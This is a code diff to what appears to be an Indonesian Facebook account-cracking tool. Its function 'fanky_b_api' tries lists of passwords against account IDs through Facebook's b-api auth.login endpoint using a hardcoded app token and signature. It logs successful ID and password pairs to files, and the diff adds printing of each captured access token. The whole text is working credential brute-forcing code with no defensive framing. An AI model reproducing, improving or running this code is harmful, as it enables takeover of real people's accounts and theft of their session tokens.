@@ -1303,7 +1303,8 @@ def fanky_b_api(idf, pwv):
 	ses = requests.Session()
 	prog.update(des,description=f" {K2}•{H2} FANKY B-API {H2}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
 	prog.advance(des)
-	ua = random.choice(ua_b_api)
+	ua = "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36"
+	#ua = random.choice(ua_b_api)
 	for pw in pwv:
 		try:
 			if 'ya' in ualuh: ua = ualu[0]
@@ -1313,30 +1314,37 @@ def fanky_b_api(idf, pwv):
 			# params = { "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32", "sdk_version": random.randint(40, 80), "email": idf, "password": pw, "locale": "id_ID", "sdk": "android", "generate_session_cookies": "1", "sig": "3f555f99fb61fcd7aa0c44f58f522ef6", "advertiser_id": str(uuid.uuid4()), "device_id": str(uuid.uuid4()), "family_device_id": str(uuid.uuid4()), "credentials_type": "password", "client_country_code": "ID", "method": "auth.login"}
 			params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': idf, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
 			api = 'https://b-api.facebook.com/method/auth.login'
-			po = requests.get(api, params=params, headers=headers,proxies=proxs) 
+			fankyngeri = requests.post(api, headers=headers, data=params)
 			#match = re.search(r'(EAAA)\w+', str(po.text))
-			if re.search(r'(EAAA)\w+', str(po.text)):
+			if "access_token" in fankyngeri.json():
 				ok += 1
-				#access_token = match.group(1)  # Ambil token yang cocok
-				tree = Tree(Panel.fit(f"""{H2}  AKUN SUKSES {P2}""", style=f"{color_panel}"), guide_style="bold grey100")
+				tree = Tree(Panel.fit(f"{H2} LOGIN BERHASIL {P2}", style=f"{color_panel}"), guide_style="bold grey100")
 				tree.add(Panel.fit(f"{H2}{idf} | {pw}{P2}", style=f"{color_panel}"))
-				tree.add(Panel.fit(f"{H2}{tahun(idf)}{P2}", style=f"{color_panel}"))
-				tree.add(Panel(f"{U2}{ua}{P2}", style=f"{color_panel}"))
-				#tree.add(Panel(f"{U2}{access_token}{P2}", style=f"{color_panel}"))
+				tree.add(Panel.fit(f"{H2}Access Token: {fankyngeri.json()['access_token']}{P2}", style=f"{color_panel}"))
 				prints(tree)
-				open("OK/" + okc, "a").write(idf + "|" + pw + "\n")
 				break
-			elif 'www.facebook.com' in po.json()['error_msg']:
-				cp += 1
-				tree = Tree(Panel.fit(f"""{K2}  AKUN CHECKPOINT{P2}""", style=f"{color_panel}"), guide_style="bold grey100")
-				tree.add(Panel.fit(f"{K2}{idf} | {pw}{P2}", style=f"{color_panel}"))
-				tree.add(Panel.fit(f"{K2}{tahun(idf)}{P2}", style=f"{color_panel}"))
-				tree.add(Panel(f"{M2}{ua}{P2}", style=f"{color_panel}"))
-				prints(tree)
-				open("CP/" + cpc, "a").write(idf + "|" + pw + "\n")
-				break
+			elif "error_code" in fankyngeri.json():
+				error_code = fankyngeri.json()["error_code"]
+				error_msg = fankyngeri.json()["error_msg"]
+				if error_code == 401:
+					cp += 1
+					tree = Tree(Panel.fit(f"{K2} AKUN CHECKPOINT {P2}", style=f"{color_panel}"), guide_style="bold grey100")
+					tree.add(Panel.fit(f"{K2}{idf} | {pw}{P2}", style=f"{color_panel}"))
+					tree.add(Panel.fit(f"{K2}{tahun(idf)}{P2}", style=f"{color_panel}"))
+					tree.add(Panel(f"{M2}{ua}{P2}", style=f"{color_panel}"))
+					tree.add(Panel(f"{M2}{error_msg}{P2}", style=f"{color_panel}"))
+					prints(tree)
+					open("CP/" + cpc, "a").write(idf + "|" + pw + "\n")
+					break
+				elif error_code == 405:
+					tree = Tree(Panel.fit(f"{M2} AKUN DIBLOKIR {P2}", style=f"{color_panel}"), guide_style="bold grey100")
+					tree.add(Panel.fit(f"{M2}Akun tidak bisa login!{P2}", style=f"{color_panel}"))
+					prints(tree)
+					break
+				else:
+					continue
 			else:
-				continue
+				continue 
 		except requests.exceptions.ConnectionError:
 			time.sleep(31)
 	loop+=1
